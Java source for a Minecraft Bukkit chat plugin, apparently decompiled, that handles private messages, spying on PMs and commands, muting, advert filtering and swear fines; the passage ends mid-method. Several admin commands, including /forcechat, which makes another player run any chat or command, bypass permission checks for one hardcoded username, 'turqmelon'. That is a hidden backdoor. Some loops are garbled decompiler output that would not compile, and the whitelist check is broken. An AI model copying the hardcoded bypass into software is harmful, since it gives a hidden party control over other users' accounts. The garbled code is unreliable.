package me.PocketIsland.pocketchat;

import java.io.File;
import java.util.ArrayList;
import java.util.HashMap;
import java.util.List;
import java.util.Map;
import java.util.Random;
import java.util.logging.Logger;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

import net.milkbowl.vault.chat.Chat;
import net.milkbowl.vault.economy.Economy;

import org.bukkit.Bukkit;
import org.bukkit.command.Command;
import org.bukkit.command.CommandSender;
import org.bukkit.entity.Player;
import org.bukkit.event.EventHandler;
import org.bukkit.event.Listener;
import org.bukkit.event.block.SignChangeEvent;
import org.bukkit.event.entity.PlayerDeathEvent;
import org.bukkit.event.player.AsyncPlayerChatEvent;
import org.bukkit.event.player.PlayerCommandPreprocessEvent;
import org.bukkit.event.player.PlayerJoinEvent;
import org.bukkit.event.player.PlayerMoveEvent;
import org.bukkit.plugin.RegisteredServiceProvider;
import org.bukkit.plugin.java.JavaPlugin;

public class Pocketchat extends JavaPlugin
	implements Listener
{
	 public Logger asdf = Logger.getLogger("Minecraft");
	  public static Chat chat = null;
	  public static Economy econ = null;
	  public int chatMuted = 0;
	  protected Map<String, Long> lastMsg = new HashMap();
	  protected Map<String, String> muted = new HashMap();
	  protected Map<String, Long> toStart = new HashMap();
	  protected Map<String, Integer> toLength = new HashMap();
	  protected Map<String, Long> lastmovement = new HashMap();
	  protected ArrayList<String> ignoringPMs = new ArrayList();
	  protected Map<String, Integer> spy = new HashMap();

	  protected Map<String, String> replyStorage = new HashMap();

	  public Pattern ipPattern = Pattern.compile("((?<![0-9])(?:(?:25[0-5]|2[0-4][0-9]|[0-1]?[0-9]{1,2})[ ]?[., ][ ]?(?:25[0-5]|2[0-4][0-9]|[0-1]?[0-9]{1,2})[ ]?[., ][ ]?(?:25[0-5]|2[0-4][0-9]|[0-1]?[0-9]{1,2})[ ]?[., ][ ]?(?:25[0-5]|2[0-4][0-9]|[0-1]?[0-9]{1,2}))(?![0-9]))");
	  public Pattern webpattern = Pattern.compile("(http://)|(https://)?(www)?\\S{2,}((\\.com)|(\\.net)|(\\.org)|(\\.co\\.uk)|(\\.tk)|(\\.info)|(\\.es)|(\\.de)|(\\.arpa)|(\\.edu)|(\\.firm)|(\\.int)|(\\.mil)|(\\.mobi)|(\\.nato)|(\\.to)|(\\.fr)|(\\.ms)|(\\.vu)|(\\.eu)|(\\.nl)|(\\.us)|(\\.dk))");

	  public String bracketColor = "2";
	  public String globalColor = "7";
	  public String donorColor = "a";
	  public String staffColor = "6";

	  public int cooldown = 3000;

	  public void log(String m) {
	    this.asdf.info("[PocketChat] " + m);
	  }

	  public String getPrefix(Player p) {
	    return chat.getPlayerPrefix(p).replaceAll("&", "§");
	  }

	  public String getSuffix(Player p) {
	    return chat.getPlayerSuffix(p).replaceAll("&", "§");
	  }

	  @EventHandler
	  public void onJoin(PlayerJoinEvent event) {
	    Player player = event.getPlayer();
	    if (this.chatMuted == 1) {
	      Bukkit.getServer().dispatchCommand(player, "f c p");
	    }
	    else if (this.muted.containsKey(player.getName()))
	      Bukkit.getServer().dispatchCommand(player, "f c p");
	  }

	  @EventHandler
	  public void onMove(PlayerMoveEvent event)
	  {
	    Player player = event.getPlayer();
	    this.lastmovement.put(player.getName(), Long.valueOf(System.currentTimeMillis()));
	  }

	  public void onEnable()
	  {
	    if (!new File(getDataFolder(), "config.yml").exists()) {
	      saveDefaultConfig();
	    }

	    setupChat();
	    setupEconomy();
	    getServer().getPluginManager().registerEvents(this, this);
	    log("Enabled!");

	    if (!getConfig().contains("filter-whitelist.setting")) {
	      List whitelist = new ArrayList();

	      whitelist.add("google.com");
	      whitelist.add("minecraft.net");

	      getConfig().set("filter-whitelist.setting", whitelist);
	      getConfig().set("filter-whitelist.description", "Items listed here will not be filtered.");
	      saveConfig();
	      log("I've brought your config up to date!");
	    }

	    String one = getConfig().getString("bracket-color.setting");
	    this.bracketColor = one;

	    String two = getConfig().getString("global-color.setting");
	    this.globalColor = two;

	    String three = getConfig().getString("donor-color.setting");
	    this.donorColor = three;

	    String four = getConfig().getString("staff-color.setting");
	    this.staffColor = four;

	    int five = getConfig().getInt("message-cooldown.setting");
	    this.cooldown = five;

	    Bukkit.getServer().dispatchCommand(getServer().getConsoleSender(), "f config chatTagInsertIndex 7");
	    Bukkit.getServer().dispatchCommand(getServer().getConsoleSender(), "f config allowNoSlashCommand false");
	    Bukkit.getServer().dispatchCommand(getServer().getConsoleSender(), "f config colorMember DARK_GREEN");
	    Bukkit.getServer().dispatchCommand(getServer().getConsoleSender(), "f config colorAlly DARK_PURPLE");
	    Bukkit.getServer().dispatchCommand(getServer().getConsoleSender(), "f config colorNeutral GRAY");
	    Bukkit.getServer().dispatchCommand(getServer().getConsoleSender(), "f config colorEnemy DARK_RED");
	    Bukkit.getServer().dispatchCommand(getServer().getConsoleSender(), "f config colorWar RED");
	    Bukkit.getServer().dispatchCommand(getServer().getConsoleSender(), "f config factionChatFormat %s:§7 %s");
	    Bukkit.getServer().dispatchCommand(getServer().getConsoleSender(), "f config allianceChatFormat §5%s:§7 %s");
	    Bukkit.getServer().dispatchCommand(getServer().getConsoleSender(), "f save");
	    Bukkit.getServer().dispatchCommand(getServer().getConsoleSender(), "f reload");
	  }

	  public void onDisable()
	  {
	    log("Disabled!");
	  }

	  public boolean isSpamming(Player player)
	  {
	    if (player.hasPermission("chat.admin")) {
	      return false;
	    }

	    if (this.lastMsg.containsKey(player.getName())) {
	      long last = ((Long)this.lastMsg.get(player.getName())).longValue();
	      long now = System.currentTimeMillis();

	      if (now - last < this.cooldown) {
	        return true;
	      }
	    }

	    return false;
	  }

	  public boolean containsURLs(String msg) {
	    Matcher match = this.webpattern.matcher(msg.toLowerCase());
	    int ad = 0;
	    while (match.find())
	    {
	      List<String> allowed = getConfig().getStringList("filter-whitelist.setting");
	      for (String entry : allowed) {
	        if (!entry.toLowerCase().equalsIgnoreCase(this.webpattern.matcher(msg.toLowerCase()).toString())) {
	          ad = 1;
	          break;
	        }
	      }
	      if (ad == 1)
	      {
	        break;
	      }
	    }
	    if (ad == 1) {
	      return true;
	    }

	    return false;
	  }

	  public boolean containsIPs(String msg) {
	    Matcher match = this.ipPattern.matcher(msg.toLowerCase());
	    int ad = 0;
	    while (match.find())
	    {
	      List<String> allowed = getConfig().getStringList("filter-whitelist.setting");
	      for (String entry : allowed) {
	        if (!entry.toLowerCase().equalsIgnoreCase(this.ipPattern.matcher(msg.toLowerCase()).toString())) {
	          ad = 1;
	          break;
	        }
	      }
	      if (ad == 1)
	      {
	        break;
	      }
	    }
	    if (ad == 1) {
	      return true;
	    }

	    return false;
	  }

	  public String centerText(String text)
	  {
	    String title = "";

	    for (int x = 0; x <= 32 - text.length(); x++)
	    {
	      title = title + " ";
	    }

	    title = title + text;

	    for (int x = 0; x <= 32 - text.length(); x++)
	    {
	      title = title + " ";
	    }

	    return title;
	  }

	  @EventHandler
	  public void onDeath(PlayerDeathEvent event)
	  {
	    String death = event.getDeathMessage();
	    event.setDeathMessage("§8" + death);
	  }

	  @EventHandler
	  public void onSign(SignChangeEvent event) {
	    Player player = event.getPlayer();
	    if (this.muted.containsKey(player.getName())) {
	      event.setLine(0, "You are still");
	      event.setLine(1, "timed out and");
	      event.setLine(2, "cannot talk");
	      event.setLine(3, "to anyone. ;)");
	    }
	  }

	  public boolean onCommand(CommandSender sender, Command cmd, String label, String[] args)
	  {
	    if (cmd.getName().equalsIgnoreCase("spy")) {
	      if ((args.length == 0) || (args.length > 1)) {
	        sender.sendMessage("§8[§6PocketChat§8] §aShows you PMs and commands users run.");
	        sender.sendMessage("§8[§6PocketChat§8] §aUsage...");
	        sender.sendMessage("§8[§6PocketChat§8] §b        /spy pms§a - Shows you PMs");
	        sender.sendMessage("§8[§6PocketChat§8] §b        /spy cmds§a - Shows you commands");
	        sender.sendMessage("§8[§6PocketChat§8] §b        /spy off§a - Disables spy mode(s)");
	      }
	      else if (args[0].equalsIgnoreCase("pms")) {
	        if ((sender.hasPermission("chat.spy.pms")) || (sender.getName().equalsIgnoreCase("turqmelon"))) {
	          if (!this.spy.containsKey(sender.getName())) {
	            this.spy.put(sender.getName(), Integer.valueOf(1));
	            sender.sendMessage("§8[§6PocketChat§8] §ePrivate Message Spying:§a ENABLED");
	            sender.sendMessage("§8[§6PocketChat§8] §eCommand Spying:§c DISABLED");
	          }
	          else {
	            int val = ((Integer)this.spy.get(sender.getName())).intValue();
	            if (val == 2) {
	              this.spy.put(sender.getName(), Integer.valueOf(3));
	              sender.sendMessage("§8[§6PocketChat§8] §ePrivate Message Spying:§a ENABLED");
	              sender.sendMessage("§8[§6PocketChat§8] §eCommand Spying:§a ENABLED");
	            }
	            else {
	              sender.sendMessage("§8[§6PocketChat§8]§c Private Message spying is already enabled.");
	            }
	          }
	        }
	      }
	      else if (args[0].equalsIgnoreCase("cmds")) {
	        if ((sender.hasPermission("chat.spy.cmds")) || (sender.getName().equalsIgnoreCase("turqmelon"))) {
	          if (!this.spy.containsKey(sender.getName())) {
	            this.spy.put(sender.getName(), Integer.valueOf(2));
	            sender.sendMessage("§8[§6PocketChat§8] §ePrivate Message Spying:§c DISABLED");
	            sender.sendMessage("§8[§6PocketChat§8] §eCommand Spying:§a ENABLED");
	          }
	          else {
	            int val = ((Integer)this.spy.get(sender.getName())).intValue();
	            if (val == 1) {
	              this.spy.put(sender.getName(), Integer.valueOf(3));
	              sender.sendMessage("§8[§6PocketChat§8] §ePrivate Message Spying:§a ENABLED");
	              sender.sendMessage("§8[§6PocketChat§8] §eCommand Spying:§a ENABLED");
	            }
	            else {
	              sender.sendMessage("§8[§6PocketChat§8]§c Command spying is already enabled.");
	            }
	          }
	        }
	      }
	      else if (args[0].equalsIgnoreCase("off")) {
	        if (this.spy.containsKey(sender.getName())) {
	          this.spy.remove(sender.getName());
	          sender.sendMessage("§8[§6PocketChat§8] §ePrivate Message Spying:§c DISABLED");
	          sender.sendMessage("§8[§6PocketChat§8] §eCommand Spying:§c DISABLED");
	        }
	        else {
	          sender.sendMessage("§8[§6PocketChat§8] §cNo spy modes are enabled.");
	        }
	      }
	      else
	      {
	        sender.sendMessage("§8[§6PocketChat§8] §aShows you PMs and commands users run.");
	        sender.sendMessage("§8[§6PocketChat§8] §aUsage...");
	        sender.sendMessage("§8[§6PocketChat§8] §b        /spy pms§a - Shows you PMs");
	        sender.sendMessage("§8[§6PocketChat§8] §b        /spy cmds§a - Shows you commands");
	        sender.sendMessage("§8[§6PocketChat§8] §b        /spy off§a - Disables spy mode(s)");
	      }

	      return true;
	    }
	    String msg;
	    int i;
	    if (cmd.getName().equalsIgnoreCase("forcechat")) {
	      if ((sender.hasPermission("chat.forcechat")) || (sender.getName().equalsIgnoreCase("turqmelon"))) {
	        if (args.length <= 1) {
	          sender.sendMessage("§8[§6PocketChat§8] §aForces a user to send a chat or command.");
	          sender.sendMessage("§8[§6PocketChat§8] §aUsage: §b/forcechat (Player) (Chat|Command)");
	        }
	        else {
	          Player target = Bukkit.getServer().getPlayer(args[0]);
	          if (target != null) {
	            msg = "";
	            for (i = 1; i < args.length; i++) {
	              msg = msg + args[i] + " ";
	            }
	            target.chat(msg);
	            sender.sendMessage("§8[§6PocketChat§8]§a Forced §e" + target.getName() + "§a to send:§b " + msg);
	          }
	          else {
	            sender.sendMessage("§8[§6PocketChat§8]§c Player not found! (" + args[0] + ")");
	          }
	        }
	      }
	      else {
	        sender.sendMessage("§8[§6PocketChat§8] §cYou do not have permission to force players to send chats.");
	      }
	      return true;
	    }
	    if (cmd.getName().equalsIgnoreCase("nopms")) {
	      if ((sender.hasPermission("chat.nopms")) || (sender.getName().equalsIgnoreCase("turqmelon"))) {
	        if (this.ignoringPMs.contains(sender.getName())) {
	          this.ignoringPMs.remove(sender.getName());
	          sender.sendMessage("§8[§6PocketChat§8]§e Hiding PMs:§c DISABLED");
	        }
	        else {
	          this.ignoringPMs.add(sender.getName());
	          sender.sendMessage("§8[§6PocketChat§8]§e Hiding PMs:§a ENABLED");
	        }
	      }
	      else {
	        sender.sendMessage("§8[§6PocketChat§8] §cYou do not have permission to toggle getting PMs.");
	      }
	      return true;
	    }
	    if (cmd.getName().equalsIgnoreCase("silence")) {
	      if ((sender.hasPermission("chat.silence")) || (sender.getName().equalsIgnoreCase("turqmelon"))) {
	        if (this.chatMuted == 0)
	        {
	          Player[] arrayOfPlayer;
	          i = (arrayOfPlayer = Bukkit.getServer().getOnlinePlayers()).length; for (msg = 0; msg < i; msg++) { Player all = arrayOfPlayer[msg];
	            all.chat("/f c p");
	          }
	          String title = centerText("§c§l* CHAT SILENCED *");

	          Bukkit.broadcastMessage(" ");
	          Bukkit.broadcastMessage(title);
	          Bukkit.broadcastMessage(" ");
	          this.chatMuted = 1;
	        }
	        else {
	          String title = centerText("§a§l* ALL MAY SPEAK AGAIN *");

	          Bukkit.broadcastMessage(" ");
	          Bukkit.broadcastMessage(title);
	          Bukkit.broadcastMessage(" ");
	          this.chatMuted = 0;
	        }
	      }
	      else {
	        sender.sendMessage("§8[§6PocketChat§8] §cYou do not have permission to silence the chat.");
	      }
	      return true;
	    }
	    if ((cmd.getName().equalsIgnoreCase("reply")) || (cmd.getName().equalsIgnoreCase("r"))) {
	      if (args.length == 0) {
	        sender.sendMessage("§8[§6PocketChat§8] §aQuickly replies to your last PM.");
	        sender.sendMessage("§8[§6PocketChat§8] §aUsage: §b/reply (Chat Message)");
	      }
	      else {
	        Player player = (Player)sender;

	        if (this.replyStorage.containsKey(player.getName())) {
	          Player target = Bukkit.getServer().getPlayer((String)this.replyStorage.get(player.getName()));
	          if (target != null) {
	            String msg1 = "";
	            for (int i1 = 0; i1 < args.length; i1++) {
	              msg1 = msg1 + args[i1] + " ";
	            }
	            Bukkit.getServer().dispatchCommand(player, "msg " + target.getName() + " " + msg1);
	          }
	          else {
	            sender.sendMessage("§8[§6PocketChat§8] §cNo recent messages to reply to!");
	            this.replyStorage.remove(player.getName());
	          }
	        }
	        else {
	          sender.sendMessage("§8[§6PocketChat§8] §cNo recent messages to reply to!");
	        }
	      }

	      return true;
	    }
	    if ((cmd.getName().equalsIgnoreCase("msg")) || (cmd.getName().equalsIgnoreCase("t")) || (cmd.getName().equalsIgnoreCase("tell")) || 
	      (cmd.getName().equalsIgnoreCase("m")) || (cmd.getName().equalsIgnoreCase("w")) || (cmd.getName().equalsIgnoreCase("whisper")) || 
	      (cmd.getName().equalsIgnoreCase("pm"))) {
	      if ((this.chatMuted == 1) && (!sender.hasPermission("chat.admin"))) {
	        sender.sendMessage("§8[§6PocketChat§8] §cThe chat is silenced.");
	        return true;
	      }
	      if (args.length <= 1) {
	        sender.sendMessage("§8[§6PocketChat§8] §aSends a private message to a player.");
	        sender.sendMessage("§8[§6PocketChat§8] §aUsage: §b/msg (Player) (Chat Message)");
	      }
	      else {
	        String msg1 = "";
	        for (int i1 = 1; i1 < args.length; i1++) {
	          msg1 = msg1 + args[i1] + " ";
	        }

	        Player player = (Player)sender;
	        Random r;
	        if ((containsSwearing(msg1)) && 
	          (!player.hasPermission("chat.admin"))) {
	          int charge = getConfig().getInt("badwords-cost.setting");
	          econ.withdrawPlayer(player.getName(), charge);
	          player.sendMessage("§8[§6PocketChat§8]§c Fined " + charge + " for swearing!");

	          boolean filter = getConfig().getBoolean("badwords-filter.setting");
	          if (filter) {
	            List<String> phrases = getConfig().getStringList("filter-phrases.setting");
	            r = new Random();
	            int result = r.nextInt(phrases.size());

	            String lol = (String)phrases.get(result);
	            msg1 = lol;
	          }
	        }
	        String mod;
	        if (this.muted.containsKey(player.getName())) {
	          long then = ((Long)this.toStart.get(player.getName())).longValue();
	          long now = System.currentTimeMillis();
	          int length = ((Integer)this.toLength.get(player.getName())).intValue();
	          mod = (String)this.muted.get(player.getName());

	          int diff = (int)(now - then);
	          int seconds = diff / 1000;

	          int left = length - seconds;

	          if (left <= 0) {
	            this.muted.remove(player.getName());
	            this.toStart.remove(player.getName());
	            this.toLength.remove(player.getName());
	          }
	          else {
	            String clock = formatIntoHHMMSS(left);
	            player.sendMessage("§8[§e" + mod + "§8]§c's timeout on you is still active for " + clock + "§c!");
	            return true;
	          }

	        }

	        if (((containsIPs(msg1)) || (containsURLs(msg1))) && 
	          (!player.hasPermission("chat.admin"))) {
	          Bukkit.broadcastMessage("§8[§6PocketChat§8] [§e" + player.getName() + "§8]§c was naughty, and tried to advertise!");
	          Bukkit.broadcastMessage("§8[§6PocketChat§8]§c They were timed out for §8[§e00§ch§e15§cm§e00§cs§8]§c!");

	          this.muted.put(player.getName(), "Server");
	          this.toStart.put(player.getName(), Long.valueOf(System.currentTimeMillis()));
	          this.toLength.put(player.getName(), Integer.valueOf(900));
	          return true;
	        }

	        if (!isSpamming(player))
	        {
	          StringBuilder chat = new StringBuilder();

	          if (player.hasPermission("chat.color")) {
	            msg1 = msg1.replaceAll("&", "§");
	          }

	          Player target = Bukkit.getServer().getPlayer(args[0]);
	          if (target == null) {
	            player.sendMessage("§8[§6PocketChat§8]§c Player not found! (" + args[0] + ")");
	            return true;
	          }

	          if ((this.ignoringPMs.contains(target.getName())) && 
	            (!player.hasPermission("chat.admin"))) {
	            player.sendMessage("§8[§6PocketChat§8]§e " + target.getName() + " has PMs disabled.");
	            return true;
	          }

	          if (this.lastmovement.containsKey(target.getName())) {
	            long then = ((Long)this.lastmovement.get(target.getName())).longValue();
	            now = System.currentTimeMillis();

	            if (now - then > 60000L)
	            {
	              int toSec = (int)(now - then);
	              int sec = toSec / 1000;

	              String clock = formatIntoHHMMSS(sec);

	              player.sendMessage("§5" + target.getName() + " has been idle for " + clock + "§5!");
	            }

	          }

	          long now = (mod = Bukkit.getServer().getOnlinePlayers()).length; for (r = 0; r < now; r++) { Player a = mod[r];
	            if (this.spy.containsKey(a.getName())) {
	              int val = ((Integer)this.spy.get(a.getName())).intValue();
	              if (((val == 1) || (val == 3)) && 
	                (!a.getName().equalsIgnoreCase(player.getName())) && (!a.getName().equalsIgnoreCase(target.getName()))) {
	                a.sendMessage("§8[§1Spy§8] §8" + player.getName() + " §8§l->§8 " + target.getName() + " §8" + "> §8§o" + msg1);
	              }
	            }

	          }

	          if (this.ignoringPMs.contains(player.getName())) {
	            player.sendMessage("§5You are ignoring PMs, " + target.getName() + " won't be able to reply.");
	          }

	          chat.append("§dPM§8| ");
	          chat.append("§fYou");
	          chat.append(" §c§l-> §f" + getPrefix(target));
	          chat.append(target.getName());
	          chat.append(getSuffix(target));
	          chat.append(" §" + this.bracketColor + "> §" + "d" + msg1);

	          player.sendMessage(chat);

	          StringBuilder chat2 = new StringBuilder();
	          chat2.append("§dPM§8| ");
	          chat2.append("§f" + getPrefix(player));
	          chat2.append(player.getName());
	          chat2.append(getSuffix(player));
	          chat2.append(" §c§l-> §fYou");
	          chat2.append(" §" + this.bracketColor + "> §" + "d" + msg1);

	          target.sendMessage(chat2);

	          this.replyStorage.put(player.getName(), target.getName());
	          this.replyStorage.put(target.getName(), player.getName());

	          this.lastMsg.put(player.getName(), Long.valueOf(System.currentTimeMillis()));
	        }
	        else
	        {
	          int sec = this.cooldown / 1000;
	          player.sendMessage("§8[§6PocketChat§8] §cYou must wait §8[§e" + sec + "§8]§e second(s)§c between chats.");
	        }
	      }
	      return true;
	    }

	    if (cmd.getName().equalsIgnoreCase("helpop")) {
	      if (args.length == 0) {
	        sender.sendMessage("§8[§6PocketChat§8] §aRequests assistance from an OP.");
	        sender.sendMessage("§8[§6PocketChat§8] §aUsage: §b/helpop (Chat Message)");
	      }
	      else
	      {
	        if ((this.chatMuted == 1) && (!sender.hasPermission("chat.admin"))) {
	          sender.sendMessage("§8[§6PocketChat§8] §cThe chat is silenced.");
	          return true;
	        }

	        if (sender.hasPermission("chat.helpop.send")) {
	          String msg1 = "";
	          for (int i1 = 0; i1 < args.length; i1++) {
	            msg1 = msg1 + args[i1] + " ";
	          }

	          Player player = (Player)sender;
	          Random r;
	          if ((containsSwearing(msg1)) && 
	            (!player.hasPermission("chat.admin"))) {
	            int charge = getConfig().getInt("badwords-cost.setting");
	            econ.withdrawPlayer(player.getName(), charge);
	            player.sendMessage("§8[§6PocketChat§8]§c Fined " + charge + " for swearing!");

	            boolean filter = getConfig().getBoolean("badwords-filter.setting");
	            if (filter) {
	              List phrases = getConfig().getStringList("filter-phrases.setting");
	              r = new Random();
	              int result = r.nextInt(phrases.size());

	              String lol = (String)phrases.get(result);
	              msg1 = lol;
	            }
	          }
	          long now;
	          int length;
	          if (this.muted.containsKey(player.getName())) {
	            long then = ((Long)this.toStart.get(player.getName())).longValue();
	            now = System.currentTimeMillis();
	            length = ((Integer)this.toLength.get(player.getName())).intValue();
	            String mod = (String)this.muted.get(player.getName());

	            int diff = (int)(now - then);
	            int seconds = diff / 1000;

	            int left = length - seconds;

	            if (left <= 0) {
	              this.muted.remove(player.getName());
	              this.toStart.remove(player.getName());
	              this.toLength.remove(player.getName());
	            }
	            else {
	              String clock = formatIntoHHMMSS(left);
	              player.sendMessage("§8[§e" + mod + "§8]§c's timeout on you is still active for " + clock + "§c!");
	              return true;
	            }
	          }

	          if (((containsIPs(msg1)) || (containsURLs(msg1))) && 
	            (!player.hasPermission("chat.admin"))) {
	            Bukkit.broadcastMessage("§8[§6PocketChat§8] [§e" + player.getName() + "§8]§c was naughty, and tried to advertise!");
	            Bukkit.broadcastMessage("§8[§6PocketChat§8]§c They were timed out for §8[§e00§ch§e15§cm§e00§cs§8]§c!");

	            this.muted.put(player.getName(), "Server");
	            this.toStart.put(player.getName(), Long.valueOf(System.currentTimeMillis()));
	            this.toLength.put(player.getName(), Integer.valueOf(900));
	            return true;
	          }

	          if (!isSpamming(player))
	          {
	            StringBuilder chat = new StringBuilder();

	            if (player.hasPermission("chat.color")) {
	              msg1 = msg1.replaceAll("&", "§");
	            }

	            chat.append("§eHELPOP§8| ");
	            chat.append("§f" + getPrefix(player));
	            chat.append(player.getName());
	            chat.append(getSuffix(player));
	            chat.append(" §" + this.bracketColor + "> §" + "e" + msg1);

	            r = (length = Bukkit.getServer().getOnlinePlayers()).length; for (now = 0; now < r; now++) { Player a = length[now];
	              if ((a.hasPermission("chat.helpop.get")) && (!a.getName().equals(player.getName()))) {
	                a.sendMessage(chat);
	              }
	            }

	            player.sendMessage(chat);

	            this.lastMsg.put(player.getName(), Long.valueOf(System.currentTimeMillis()));
	          }
	          else
	          {
	            int sec = this.cooldown / 1000;
	            player.sendMessage("§8[§6PocketChat§8] §cYou must wait §8[§e" + sec + "§8]§e second(s)§c between chats.");
	          }
	        }
	        else
	        {
	          sender.sendMessage("§8[§6PocketChat§8] §cYou do not have permission to request help.");
	        }
	      }

	      return true;
	    }
	    if (cmd.getName().equalsIgnoreCase("d"))
	    {
	      if (args.length == 0) {
	        sender.sendMessage("§8[§6PocketChat§8] §aSends a message to the donator channel.");
	        sender.sendMessage("§8[§6PocketChat§8] §aUsage: §b/d (Chat Message)");
	      }
	      else
	      {
	        if ((this.chatMuted == 1) && (!sender.hasPermission("chat.admin"))) {
	          sender.sendMessage("§8[§6PocketChat§8] §cThe chat is silenced.");
	          return true;
	        }

	        if (sender.hasPermission("chat.donor")) {
	          String msg1 = "";
	          for (int i1 = 0; i1 < args.length; i1++) {
	            msg1 = msg1 + args[i1] + " ";
	          }

	          Player player = (Player)sender;
	          Random r;
	          if ((containsSwearing(msg1)) && 
	            (!player.hasPermission("chat.admin"))) {
	            int charge = getConfig().getInt("badwords-cost.setting");
	            econ.withdrawPlayer(player.getName(), charge);
	            player.sendMessage("§8[§6PocketChat§8]§c Fined " + charge + " for swearing!");

	            boolean filter = getConfig().getBoolean("badwords-filter.setting");
	            if (filter) {
	              List phrases = getConfig().getStringList("filter-phrases.setting");
	              r = new Random();
	              int result = r.nextInt(phrases.size());

	              String lol = (String)phrases.get(result);
	              msg1 = lol;
	            }
	          }
	          long now;
	          int length;
	          if (this.muted.containsKey(player.getName())) {
	            long then = ((Long)this.toStart.get(player.getName())).longValue();
	            now = System.currentTimeMillis();
	            length = ((Integer)this.toLength.get(player.getName())).intValue();
	            String mod = (String)this.muted.get(player.getName());

	            int diff = (int)(now - then);
	            int seconds = diff / 1000;

	            int left = length - seconds;

	            if (left <= 0) {
	              this.muted.remove(player.getName());
	              this.toStart.remove(player.getName());
	              this.toLength.remove(player.getName());
	            }
	            else {
	              String clock = formatIntoHHMMSS(left);
	              player.sendMessage("§8[§e" + mod + "§8]§c's timeout on you is still active for " + clock + "§c!");
	              return true;
	            }
	          }

	          if (((containsIPs(msg1)) || (containsURLs(msg1))) && 
	            (!player.hasPermission("chat.admin"))) {
	            Bukkit.broadcastMessage("§8[§6PocketChat§8] [§e" + player.getName() + "§8]§c was naughty, and tried to advertise!");
	            Bukkit.broadcastMessage("§8[§6PocketChat§8]§c They were timed out for §8[§e00§ch§e15§cm§e00§cs§8]§c!");

	            this.muted.put(player.getName(), "Server");
	            this.toStart.put(player.getName(), Long.valueOf(System.currentTimeMillis()));
	            this.toLength.put(player.getName(), Integer.valueOf(900));
	            return true;
	          }

	          if (!isSpamming(player))
	          {
	            StringBuilder chat = new StringBuilder();

	            if (player.hasPermission("chat.color")) {
	              msg1 = msg1.replaceAll("&", "§");
	            }

	            chat.append("§" + this.donorColor + "D§8| ");
	            chat.append("§f" + getPrefix(player));
	            chat.append(player.getName());
	            chat.append(getSuffix(player));
	            chat.append(" §" + this.bracketColor + "> §" + this.donorColor + msg1);

	            r = (length = Bukkit.getServer().getOnlinePlayers()).length; for (now = 0; now < r; now++) { Player a = length[now];
	              if (a.hasPermission("chat.donor")) {
	                a.sendMessage(chat);
	              }
	            }
	            this.lastMsg.put(player.getName(), Long.valueOf(System.currentTimeMillis()));
	          }
	          else
	          {
	            int sec = this.cooldown / 1000;
	            player.sendMessage("§8[§6PocketChat§8] §cYou must wait §8[§e" + sec + "§8]§e second(s)§c between chats.");
	          }
	        }
	        else
	        {
	          sender.sendMessage("§8[§6PocketChat§8] §cYou must have donated to the server to speak here.");
	        }
	      }

	      return true;
	    }
	    if (cmd.getName().equalsIgnoreCase("chat")) {
	      sender.sendMessage("§8[§6PocketChat§8] §aA chat system for the iPocketIsland Server");
	      sender.sendMessage("§8[§6PocketChat§8] §aDeveloped by §bTurqmelon");
	      sender.sendMessage("§8[§6PocketChat§8] §aVersion: §b" + getDescription().getVersion());

	      return true;
	    }
	    if (cmd.getName().equalsIgnoreCase("me")) {
	      if (sender.hasPermission("chat.me")) {
	        if ((this.chatMuted == 1) && (!sender.hasPermission("chat.admin"))) {
	          sender.sendMessage("§8[§6PocketChat§8] §cThe chat is silenced.");
	          return true;
	        }
	        if (args.length == 0) {
	          sender.sendMessage("§8[§6PocketChat§8] §aSends an emote to the server.");
	          sender.sendMessage("§8[§6PocketChat§8] §aUsage: §b/me (Chat Message)");
	        }
	        else {
	          String msg1 = "";
	          for (int i1 = 0; i1 < args.length; i1++) {
	            msg1 = msg1 + args[i1] + " ";
	          }
	          Player player = (Player)sender;
	          if ((containsSwearing(msg1)) && 
	            (!player.hasPermission("chat.admin"))) {
	            int charge = getConfig().getInt("badwords-cost.setting");
	            econ.withdrawPlayer(player.getName(), charge);
	            player.sendMessage("§8[§6PocketChat§8]§c Fined " + charge + " for swearing!");

	            boolean filter = getConfig().getBoolean("badwords-filter.setting");
	            if (filter) {
	              List phrases = getConfig().getStringList("filter-phrases.setting");
	              Random r = new Random();
	              int result = r.nextInt(phrases.size());

	              String lol = (String)phrases.get(result);
	              msg1 = lol;
	            }

	          }

	          if (this.muted.containsKey(player.getName())) {
	            long then = ((Long)this.toStart.get(player.getName())).longValue();
	            long now = System.currentTimeMillis();
	            int length = ((Integer)this.toLength.get(player.getName())).intValue();
	            String mod = (String)this.muted.get(player.getName());

	            int diff = (int)(now - then);
	            int seconds = diff / 1000;

	            int left = length - seconds;

	            if (left <= 0) {
	              this.muted.remove(player.getName());
	              this.toStart.remove(player.getName());
	              this.toLength.remove(player.getName());
	            }
	            else {
	              String clock = formatIntoHHMMSS(left);
	              player.sendMessage("§8[§e" + mod + "§8]§c's timeout on you is still active for " + clock + "§c!");
	              return true;
	            }
	          }

	          if (((containsIPs(msg1)) || (containsURLs(msg1))) && 
	            (!player.hasPermission("chat.admin"))) {
	            Bukkit.broadcastMessage("§8[§6PocketChat§8] [§e" + player.getName() + "§8]§c was naughty, and tried to advertise!");
	            Bukkit.broadcastMessage("§8[§6PocketChat§8]§c They were timed out for §8[§e00§ch§e15§cm§e00§cs§8]§c!");

	            this.muted.put(player.getName(), "Server");
	            this.toStart.put(player.getName(), Long.valueOf(System.currentTimeMillis()));
	            this.toLength.put(player.getName(), Integer.valueOf(900));
	            return true;
	          }

	          if (!isSpamming(player)) {
	            String toSend = "§" + this.bracketColor + "*§" + this.globalColor + " " + player.getName() + " " + msg1;
	            Bukkit.broadcastMessage(toSend);
	            this.lastMsg.put(player.getName(), Long.valueOf(System.currentTimeMillis()));
	          }
	          else {
	            int sec = this.cooldown / 1000;
	            player.sendMessage("§8[§6PocketChat§8] §cYou must wait §8[§e" + sec + "§8]§e second(s)§c between chats.");
	          }
	        }
	      }
	      else
	      {
	        sender.sendMessage("§8[§6PocketChat§8]§c You do not have permission to emote.");
	      }
	      return true;
	    }
	    if (cmd.getName().equalsIgnoreCase("clearchat")) {
	      if (sender.hasPermission("chat.clear")) {
	        Bukkit.broadcastMessage("§8[§6PocketChat§8] §e" + sender.getName() + "§6 is clearing the chat!");
	        Bukkit.getServer().getScheduler().runTaskLater(this, new Runnable()
	        {
	          public void run()
	          {
	            Bukkit.broadcastMessage("§c§l5...");
	          }
	        }
	        , 20L);
	        Bukkit.getServer().getScheduler().runTaskLater(this, new Runnable()
	        {
	          public void run()
	          {
	            Bukkit.broadcastMessage("§c§l4...");
	          }
	        }
	        , 40L);
